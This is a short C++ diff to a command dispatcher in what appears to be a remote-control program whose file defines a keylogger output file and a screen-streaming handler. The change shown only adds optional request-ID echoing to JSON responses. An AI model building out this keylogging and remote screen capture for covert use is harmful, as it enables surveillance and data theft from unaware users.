@@ -7,6 +7,7 @@
 #include <fstream>
 #include <cstdio> // Cho std::remove
 #include <cerrno> // Cho ENOENT (Error No Entry)
+#include <optional>
 
 #define KEYLOGGER_FILE_NAME "keylogger.txt"
 std::string Dispatcher::handle(const std::string& request_json)
@@ -14,10 +15,14 @@ std::string Dispatcher::handle(const std::string& request_json)
     std::cout << "[Dispatcher] Incoming request: " << request_json << "\n";
 
     Json res;
+    std::optional<std::string> request_id;
 
     try {
         Json req = Json::parse(request_json);
         std::string cmd = req.value("cmd", "");
+        if (req.contains("requestId") && req["requestId"].is_string()) {
+            request_id = req["requestId"].get<std::string>();
+        }
 
         if (cmd == "ping") {
             res = handle_ping(req);
@@ -60,6 +65,9 @@ std::string Dispatcher::handle(const std::string& request_json)
         res["message"] = std::string("Exception: ") + e.what();
     }
 
+    if (request_id) {
+        res["requestId"] = *request_id;
+    }
     return res.dump();
 }
 
@@ -229,4 +237,3 @@ Json Dispatcher::handle_screen_stream(const Json& req)
 
     return resp;
 }
-
